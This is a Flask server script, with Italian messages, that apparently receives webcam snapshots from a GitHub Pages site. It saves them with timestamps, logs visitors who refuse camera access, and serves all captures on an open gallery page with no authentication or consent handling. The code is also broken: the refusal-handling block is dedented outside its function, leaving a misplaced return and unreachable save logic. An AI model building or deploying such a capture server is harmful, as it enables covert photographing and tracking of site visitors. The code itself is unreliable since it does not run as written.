from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import base64, os, pytz

app = Flask(__name__)
CORS(app, origins=["https://gino-ctrl.github.io"])

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

italian_tz = pytz.timezone("Europe/Rome")

@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json()
    action = data.get("action")
    image_data = data.get("image")

    now = datetime.now(italian_tz)

if action == "refused":
    now = datetime.now(italian_tz)
    timestamp = now.strftime("%d/%m/%Y - %H:%M:%S")
    message = f"[RIFIUTO WEBCAM] Accesso negato alle {timestamp}"
    
    print(message)
    with open("logs.txt", "a") as log_file:
        log_file.write(message + "\n")

    return jsonify({"status": "refused"})
    if not image_data:
        return jsonify({"status": "error", "message": "Nessuna immagine"}), 400

    image_data = image_data.split(",")[1]
    filename = f"{action}_{now.strftime('%Y%m%d%H%M%S')}.png"
    path = os.path.join(UPLOAD_FOLDER, filename)

    with open(path, "wb") as f:
        f.write(base64.b64decode(image_data))

    return jsonify({"status": "success", "file": filename})

@app.route("/uploads/<filename>")
def serve_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@app.route("/gallery")
def gallery():
    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    images_html = ""

    for f in files:
        if not f.lower().endswith(".png"):
            continue

        try:
            timestamp_str = f.rsplit("_", 1)[1].replace(".png", "")
            timestamp = italian_tz.localize(datetime.strptime(timestamp_str, "%Y%m%d%H%M%S"))
            ora_locale = timestamp.strftime("%d/%m/%Y - %H:%M:%S")
        except:
            ora_locale = "Data sconosciuta"

        images_html += f"""
            <div style="margin: 15px; text-align: center; max-width: 400px;">
                <img src="/uploads/{f}" style="max-width: 100%; height: auto; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);"><br>
                <div style="margin-top: 6px; font-size: 14px; color: #333;">{ora_locale}</div>
            </div>
        """

    return f"""
    <html>
    <head>
        <title>Galleria immagini</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body style="font-family: sans-serif; padding: 20px; background-color: #f9f9f9;">
        <h2 style="text-align: center; color: #003366;">Galleria Accessi</h2>
        <div style="display: flex; flex-wrap: wrap; justify-content: center;">
            {images_html}
        </div>
    </body>
    </html>
    """

@app.route("/", methods=["GET", "POST"])
def home():
    return "<h2>Server attivo. Usa /upload per POST, /gallery per galleria.</h2>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
